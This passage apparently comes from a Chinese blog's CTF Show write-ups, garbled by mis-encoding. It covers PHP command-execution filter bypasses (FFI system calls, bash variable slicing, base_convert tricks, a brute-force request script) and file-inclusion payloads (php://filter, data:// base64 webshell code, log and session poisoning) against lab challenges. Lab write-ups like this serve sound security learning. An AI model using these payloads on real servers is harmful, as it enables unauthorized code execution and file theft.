ç¤ºä¾‹&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;); echo file_get_contents(&quot;./ttmp&quot;);?&gt; å‘½ä»¤æ‰§è¡Œ å¦‚æœç›®æ ‡æœºå™¨å¼€å¯äº†è¿™ä¸€æ‰©å±•ï¼Œæˆ‘ä»¬å°±æœ‰äº†ä¸€ç§å…¨æ–°çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼Œåœ¨ system è¢«ç¦ç”¨çš„æƒ…å†µä¸‹ï¼Œåˆ™å¯ä½¿ç”¨ FFI æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä¾‹å¦‚åœ¨é¢˜ç›®ä¸­æ‰§è¡Œ /readflag å¹¶è·å– flagï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ä»¥åŠ è½½è‡ªå®šä¹‰é“¾æ¥åº“ 1# å‘½ä»¤æ‰§è¡Œ&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;/readflag &gt; /tmp/123.txt&quot;);echo file_get_contents(&quot;/tmp/123&quot;); @unlink(&quot;/tmp/123&quot;);?&gt; ç±»ä¼¼çš„æ–¹æ³•åœ¨èšå‰‘çš„ bypass disable_function ä¸­å¯è‡ªåŠ¨è°ƒç”¨ï¼Œä½†å—åˆ°ç›®å½•æƒé™å’Œ open_basedir çš„é™åˆ¶å¯¼è‡´å¾ˆå¤šæƒ…å†µä¸‹å¹¶ä¸èµ·ä½œç”¨ 1# payloadc=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var 1c=$ffi = FFI::cdef( &quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);exit();# å³c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;test.txt&quot;);exit();# éšåè®¿é—® test.txt å³å¯ 1.51 Web 118 â€” Linux bush å†…ç½®å˜é‡ â€” ${PATH:A}${PWD:A}flag in flag.php æŸ¥çœ‹æºä»£ç  å‘ç° æŠ“åŒ…å‘ç° æ˜¯ POST ä¼ å‚ code bush å†…ç½®å˜é‡ https://www.cnblogs.com/sparkdev/p/9934595.html#title_12 https://blog.51cto.com/allenh/1695810 1# æµ‹è¯• root@kali:~# echo $&#123;PWD&#125;/rootroot@kali:~# echo $&#123;PWD:0:1&#125;/root@kali:~# echo $&#123;PWD:0:2&#125;/rroot@kali:~# echo $&#123;PWD:1:2&#125;roroot@kali:~/æ¡Œé¢# echo $&#123;PWD&#125;/root/æ¡Œé¢root@kali:~/æ¡Œé¢# echo $&#123;PWD:~0&#125;é¢root@kali:~/æ¡Œé¢# echo $&#123;PWD:~2&#125;/æ¡Œé¢root@kali:~/æ¡Œé¢# echo $&#123;PWD:~1&#125;æ¡Œé¢# å¦‚æœè¿‡æ»¤æ‰äº†æ•°å­—ï¼Œå¯ä½¿ç”¨å­—æ¯ï¼Œå­—æ¯éƒ½ç›¸å½“äº 0root@kali:~/æ¡Œé¢# echo $&#123;PWD:~A&#125;é¢root@kali:~/æ¡Œé¢# echo $&#123;PWD:~C&#125;é¢root@kali:~/æ¡Œé¢# echo $&#123;PWD:~K&#125;é¢root@kali:/var/www/html# echo $&#123;PWD::2&#125;/vroot@kali:/var/www/html# echo $&#123;PWD::1&#125;/# æ„é€  nlroot@kali:~/æ¡Œé¢# cd /var/www/html/root@kali:/var/www/html# echo $&#123;PATH&#125;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@kali:/var/www/html# echo $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;nl 1# payload$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ???????? 1.52 Web 119 â€” Linux bush å†…ç½®å˜é‡ â€” æ„é€  /bin/è¿‡æ»¤äº† PATH å’Œ BASH ä¸€äº›çŸ¥è¯†ç‚¹ å¤§å†™å­—æ¯ç­‰åŒäº0 ä¸åŠ #æ˜¯å˜é‡çš„å€¼ï¼ŒåŠ äº†#æ˜¯å˜é‡çš„å€¼çš„é•¿åº¦ 1$&#123;#PWD&#125;root@kali:/var/www/html# echo $&#123;PWD&#125;/var/www/htmlroot@kali:/var/www/html# echo $&#123;#PWD&#125;13 RANDOMæ­¤å˜é‡å€¼ï¼Œéšæœºå‡ºç°æ•´æ•°ï¼ŒèŒƒå›´ä¸º0-32767ã€‚ä¸è¿‡ï¼Œè™½ç„¶è¯´æ˜¯éšæœºï¼Œä½†å¹¶ä¸æ˜¯çœŸæ­£çš„éšæœºï¼Œå› ä¸ºæ¯æ¬¡å¾—åˆ°çš„éšæœºæ•°éƒ½ä¸€æ ·ã€‚ä¸ºæ­¤ï¼Œåœ¨ä½¿ç”¨RANDOMå˜é‡å‰ï¼Œè¯·éšæ„è®¾å®šä¸€ä¸ªæ•°å­—ç»™RANDOMï¼Œå½“åšéšæœºæ•°ç§å­ï¼Œè¿™æ ·æ‰ä¸ä¼šæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°å…¶é¡ºåºéƒ½ä¸€æ ·ã€‚ å› æ­¤å…‰åˆ©ç”¨RANDOMè¿™ä¸ªå‡½æ•°ç†è®ºä¸Šå°±å¯ä»¥å¾—åˆ°æ•°å­—1-5äº†ï¼Œä¸è¿‡ç›¸å¯¹æ¥è¯´4å’Œ5çš„æ¦‚ç‡ä¼šæ›´å¤§ã€‚ SHLVL æ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨ ä¸ç†è§£ä¹Ÿæ²¡å…³ç³»ï¼Œåªè¦çŸ¥é“è¿™ä¸ªä¸œè¥¿çš„é»˜è®¤å€¼æ˜¯1ï¼Œè€Œä¸”å¦‚æœä¸è¿›è¡Œä¸€äº›ç‰¹æ®Šçš„æ“ä½œçš„è¯ï¼Œæ°¸è¿œéƒ½æ˜¯1ï¼Œæ‰€ä»¥è¿™ä¸ªå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¾—åˆ°æ•°å­—1ã€‚ 1# æ„é€  /bin/base64 flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???æˆ–$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???# æ„é€  /bin/cat flag.phpè¿™ä¸ªæ˜¯hint$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; ====&gt; /$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? æŠ“åŒ…ä¿®æ”¹ å¤šåˆ·æ–°å‡ é ç”±äº 4 å’Œ 5ä¸ç¡®å®š 1.53 Web 120 â€” Linux bush å†…ç½®å˜é‡ â€” é•¿åº¦é™åˆ¶ &lt;=651&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; é™åˆ¶é•¿åº¦ &lt;=65 1# payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 1.54 Web 121 â€” Linux bush å†…ç½®å˜é‡ â€” è¿‡æ»¤ SHLVL1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 1root@kali:/var/www/html# echo $&#123;##&#125;1root@kali:/var/www/html# echo $&#123;#?&#125;1root@kali:/var/www/html/learn# touch 1.txt root@kali:/var/www/html/learn# echo &#x27;1234567&#x27; &gt; 1.txtroot@kali:/var/www/html/learn# /bin/rev 1.1.txtroot@kali:/var/www/html/learn# /bin/rev 1.txt7654321# /bin/rev å°†æ–‡ä»¶åè¯»root@kali:/var/www/html/learn# echo $&#123;#IFS&#125;3root@kali:/var/www/html/learn# echo $&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;rroot@kali:/var/www/html/learn# echo $&#123;PWD&#125;/var/www/html/learnroot@kali:/var/www/html/learn# echo $&#123;PWD:3:1&#125;r 1# payload$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? 1.55 Web 122 â€” Linux bush å†…ç½®å˜é‡ â€” è¿‡æ»¤ # PWD ( HOMEæ›¿æ¢ ) $? è·å–ä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„è¿”å›å€¼ï¼Œ0ä»£è¡¨æˆåŠŸï¼Œé0ä»£è¡¨å¤±è´¥ã€‚è€Œä¸”è¿™ä¸ªè¿”å›å€¼åŸæ¥æ˜¯å¯æ§çš„ 1&quot;OS error code 1: Operation not permitted&quot;&quot;OS error code 2: No such file or directory&quot;&quot;OS error code 3: No such process&quot;&quot;OS error code 4: Interrupted system call&quot;&quot;OS error code 5: Input/output error&quot;&quot;OS error code 6: No such device or address&quot;&quot;OS error code 7: Argument list too long&quot;&quot;OS error code 8: Exec format error&quot;&quot;OS error code 9: Bad file descriptor&quot;&quot;OS error code 10: No child processes&quot;&quot;OS error code 11: Resource temporarily unavailable&quot;&quot;OS error code 12: Cannot allocate memory&quot;&quot;OS error code 13: Permission denied&quot;&quot;OS error code 14: Bad address&quot;&quot;OS error code 15: Block device required&quot;&quot;OS error code 16: Device or resource busy&quot;&quot;OS error code 17: File exists&quot;&quot;OS error code 18: Invalid cross-device link&quot;&quot;OS error code 19: No such device&quot;&quot;OS error code 20: Not a directory&quot;&quot;OS error code 21: Is a directory&quot;&quot;OS error code 22: Invalid argument&quot;&quot;OS error code 23: Too many open files in system&quot;&quot;OS error code 24: Too many open files&quot;&quot;OS error code 25: Inappropriate ioctl for device&quot;&quot;OS error code 26: Text file busy&quot;&quot;OS error code 27: File too large&quot;&quot;OS error code 28: No space left on device&quot;&quot;OS error code 29: Illegal seek&quot;&quot;OS error code 30: Read-only file system&quot;&quot;OS error code 31: Too many links&quot;&quot;OS error code 32: Broken pipe&quot;&quot;OS error code 33: Numerical argument out of domain&quot;&quot;OS error code 34: Numerical result out of range&quot;&quot;OS error code 35: Resource deadlock avoided&quot;&quot;OS error code 36: File name too long&quot;&quot;OS error code 37: No locks available&quot;&quot;OS error code 38: Function not implemented&quot;&quot;OS error code 39: Directory not empty&quot;&quot;OS error code 40: Too many levels of symbolic links&quot;&quot;OS error code 42: No message of desired type&quot;&quot;OS error code 43: Identifier removed&quot;&quot;OS error code 44: Channel number out of range&quot;&quot;OS error code 45: Level 2 not synchronized&quot;&quot;OS error code 46: Level 3 halted&quot;&quot;OS error code 47: Level 3 reset&quot;&quot;OS error code 48: Link number out of range&quot;&quot;OS error code 49: Protocol driver not attached&quot;&quot;OS error code 50: No CSI structure available&quot;&quot;OS error code 51: Level 2 halted&quot;&quot;OS error code 52: Invalid exchange&quot;&quot;OS error code 53: Invalid request descriptor&quot;&quot;OS error code 54: Exchange full&quot;&quot;OS error code 55: No anode&quot;&quot;OS error code 56: Invalid request code&quot;&quot;OS error code 57: Invalid slot&quot;&quot;OS error code 59: Bad font file format&quot;&quot;OS error code 60: Device not a stream&quot;&quot;OS error code 61: No data available&quot;&quot;OS error code 62: Timer expired&quot;&quot;OS error code 63: Out of streams resources&quot;&quot;OS error code 64: Machine is not on the network&quot;&quot;OS error code 65: Package not installed&quot;&quot;OS error code 66: Object is remote&quot;&quot;OS error code 67: Link has been severed&quot;&quot;OS error code 68: Advertise error&quot;&quot;OS error code 69: Srmount error&quot;&quot;OS error code 70: Communication error on send&quot;&quot;OS error code 71: Protocol error&quot;&quot;OS error code 72: Multihop attempted&quot;&quot;OS error code 73: RFS specific error&quot;&quot;OS error code 74: Bad message&quot;&quot;OS error code 75: Value too large for defined data type&quot;&quot;OS error code 76: Name not unique on network&quot;&quot;OS error code 77: File descriptor in bad state&quot;&quot;OS error code 78: Remote address changed&quot;&quot;OS error code 79: Can not access a needed shared library&quot;&quot;OS error code 80: Accessing a corrupted shared library&quot;&quot;OS error code 81: .lib section in a.out corrupted&quot;&quot;OS error code 82: Attempting to link in too many shared libraries&quot;&quot;OS error code 83: Cannot exec a shared library directly&quot;&quot;OS error code 84: Invalid or incomplete multibyte or wide character&quot;&quot;OS error code 85: Interrupted system call should be restarted&quot;&quot;OS error code 86: Streams pipe error&quot;&quot;OS error code 87: Too many users&quot;&quot;OS error code 88: Socket operation on non-socket&quot;&quot;OS error code 89: Destination address required&quot;&quot;OS error code 90: Message too long&quot;&quot;OS error code 91: Protocol wrong type for socket&quot;&quot;OS error code 92: Protocol not available&quot;&quot;OS error code 93: Protocol not supported&quot;&quot;OS error code 94: Socket type not supported&quot;&quot;OS error code 95: Operation not supported&quot;&quot;OS error code 96: Protocol family not supported&quot;&quot;OS error code 97: Address family not supported by protocol&quot;&quot;OS error code 98: Address already in use&quot;&quot;OS error code 99: Cannot assign requested address&quot;&quot;OS error code 100: Network is down&quot;&quot;OS error code 101: Network is unreachable&quot;&quot;OS error code 102: Network dropped connection on reset&quot;&quot;OS error code 103: Software caused connection abort&quot;&quot;OS error code 104: Connection reset by peer&quot;&quot;OS error code 105: No buffer space available&quot;&quot;OS error code 106: Transport endpoint is already connected&quot;&quot;OS error code 107: Transport endpoint is not connected&quot;&quot;OS error code 108: Cannot send after transport endpoint shutdown&quot;&quot;OS error code 109: Too many references: cannot splice&quot;&quot;OS error code 110: Connection timed out&quot;&quot;OS error code 111: Connection refused&quot;&quot;OS error code 112: Host is down&quot;&quot;OS error code 113: No route to host&quot;&quot;OS error code 114: Operation already in progress&quot;&quot;OS error code 115: Operation now in progress&quot;&quot;OS error code 116: Stale NFS file handle&quot;&quot;OS error code 117: Structure needs cleaning&quot;&quot;OS error code 118: Not a XENIX named type file&quot;&quot;OS error code 119: No XENIX semaphores available&quot;&quot;OS error code 120: Is a named type file&quot;&quot;OS error code 121: Remote I/O error&quot;&quot;OS error code 122: Disk quota exceeded&quot;&quot;OS error code 123: No medium found&quot;&quot;OS error code 124: Wrong medium type&quot;&quot;OS error code 125: Operation canceled&quot;&quot;OS error code 126: Required key not available&quot;&quot;OS error code 127: Key has expired&quot;&quot;OS error code 128: Key has been revoked&quot;&quot;OS error code 129: Key was rejected by service&quot;&quot;OS error code 130: Owner died&quot;&quot;OS error code 131: State not recoverable&quot;&quot;MySQL error code 132: Old database file&quot;&quot;MySQL error code 133: No record read before update&quot;&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;&quot;MySQL error code 135: No more room in record file&quot;&quot;MySQL error code 136: No more room in index file&quot;&quot;MySQL error code 137: No more records (read after end of file)&quot;&quot;MySQL error code 138: Unsupported extension used for table&quot;&quot;MySQL error code 139: Too big row&quot;&quot;MySQL error code 140: Wrong create options&quot;&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;&quot;MySQL error code 142: Unknown character set used&quot;&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;&quot;MySQL error code 144: Table is crashed and last repair failed&quot;&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;&quot;MySQL error code 147: Lock table is full; Restart program with a larger locktable&quot;&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;&quot;MySQL error code 151: Cannot add a child row&quot;&quot;MySQL error code 152: Cannot delete a parent row&quot; 1# payload&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? å¤šå¤šåˆ·æ–° å¯ä»¥è„šæœ¬å°è¯• 1import requestsurl = &#x27;http://dd95c86c-d3bc-4b4b-a9f1-6ad337b0fa51.challenge.ctf.show:8080/&#x27;data1 = &#123;&#x27;code&#x27;:r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;&#125;while True: res = requests.post(url,data = data1) if &quot;PD9waHA&quot; in res.text: print(res.text) break 1.56 Web 124 â€” base_convert | getallheaders1&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 1$content = $_GET[&#x27;c&#x27;];1. é•¿åº¦é™åˆ¶2. é»‘åå•ï¼Œç™½åå•3. eval()å‘½ä»¤æ‰§è¡Œ base_convert getallheaders **æ–¹æ³•ä¸€ï¼šæ„é€  _GET ** 1# payload?acos=system&amp;asin=ls /&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;)?acos=system&amp;asin=cat /flag&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;) æ–¹æ³•äºŒï¼šåˆ©ç”¨ getallheaders() æ›´æ”¹è¯·æ±‚å¤´ä¿¡æ¯ 1a ç„¶åæŠ“åŒ…ï¼Œå†™å…¥ 1:ls / äºŒã€æ€»ç»“Web 29-36 eval() Web 37-39 include Web 40 æ— å‚å‡½æ•° å¥—å¨ƒ Web 41 æ²¡å†™ Web 42-52 â€œ &gt;/dev/null 2&gt;&amp;1â€ Web 53-54 system() Web 55 /bin/ Web 56-57 [a-z] [0-9] Web 58-124 php://filter/read=convert.base64-encode/resource=flag.php ä¸­çš„ flag.php ä¸èƒ½ä½¿ç”¨é€šé…ç¬¦ï¼Œæ”¹ä¸º data://åè®®åˆ©ç”¨ å‚è€ƒåšå®¢ https://blog.csdn.net/rfrder/article/details/112862827 https://blog.csdn.net/rfrder/article/details/109772962 https://blog.csdn.net/njh18790816639/article/details/115580408 https://blog.csdn.net/rfrder/article/details/112862827","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-æ–‡ä»¶åŒ…å«","slug":"CTF-Show-æ–‡ä»¶åŒ…å«","date":"2021-10-01T11:12:49.000Z","updated":"2021-10-01T11:14:02.300Z","comments":true,"path":"2021/10/01/CTF-Show-æ–‡ä»¶åŒ…å«/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"CTF Show æ–‡ä»¶åŒ…å«ç¯‡ã€‚","text":"CTF Show æ–‡ä»¶åŒ…å«ç¯‡ã€‚ ä¸€ã€CTF Show â€” æ–‡ä»¶åŒ…å«1.1 Web 78 â€” æœ€ç®€å•çš„æ–‡ä»¶åŒ…å« â€” å„ç§ä¼ªåè®® ç»•è¿‡1234567&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1234?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;#æŸ¥çœ‹æºä»£ç ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=å†…å®¹æ˜¯&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt; 1.2 Web 79 â€” è¿‡æ»¤ php â€” data:// base64 ç»•è¿‡12345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4= 1.3 Web 80 â€” è¿‡æ»¤ phpã€data â€” æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼ˆåŒæ—¶å†™ä¸Šä»£ç ï¼‰123456789&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; æŠ“åŒ…å¯çŸ¥ï¼šnginx æœåŠ¡å™¨ 123#åŒ…å«æ—¥å¿—æ–‡ä»¶?file=/var/log/nginx/access.logå†™å…¥phpä»£ç  1.4 Web 81 â€” è¿‡æ»¤ phpã€dataã€: â€” æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼ˆåŒæ—¶å†™ä¸Šä»£ç ï¼‰12345678910&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1#åŒä¸Šï¼Œæ—¥å¿—åŒ…å« 1.5 Web 82-86 â€” è¿‡æ»¤ phpã€dataã€: ã€. â€” SESSION æ–‡ä»¶åŒ…å«1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSåŠ æ¡ä»¶ç«äº‰è¿›è¡Œæ–‡ä»¶åŒ…å« 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; ä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ åˆ©ç”¨ session.upload_progress è¿›è¡Œæ–‡ä»¶åŒ…å«åˆ©ç”¨https://www.cnblogs.com/NPFS/p/13795170.html https://www.freebuf.com/news/202819.html ç›®çš„ï¼šåˆ©ç”¨ session.upload_progress å°†æœ¨é©¬å†™å…¥ session æ–‡ä»¶ï¼Œç„¶ååŒ…å« session æ–‡ä»¶ åˆ›å»º session æ–‡ä»¶ï¼ˆæ—  session_start() ï¼‰ é€‰é¡¹ session.auto_start=On ï¼ŒPHPåœ¨æ¥æ”¶è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ– Sessionï¼Œä¸éœ€è¦æ‰§è¡Œ session_start()ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥é€‰é¡¹ å…³é—­ ã€‚ é€‰é¡¹ session.use_strict_mode=0 ï¼Œé»˜è®¤å€¼æ˜¯0å³æœªå¯åŠ¨æ—¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ sessionã€‚ æ–¹æ³•ï¼šç”¨æˆ·è‡ªå·±æŠ“åŒ…ï¼Œåœ¨ Cookie é‡Œé¢è®¾ç½®ï¼ŒPHPSESSION=flagï¼Œé‚£ä¹ˆPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šä¹Ÿåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ /tmp/sess_flag ã€‚è¿™æ—¶ç”¨æˆ·å¹¶æ²¡æœ‰åˆå§‹åŒ– session ï¼Œphpä¹Ÿç…§æ ·è‡ªåŠ¨åˆå§‹åŒ– 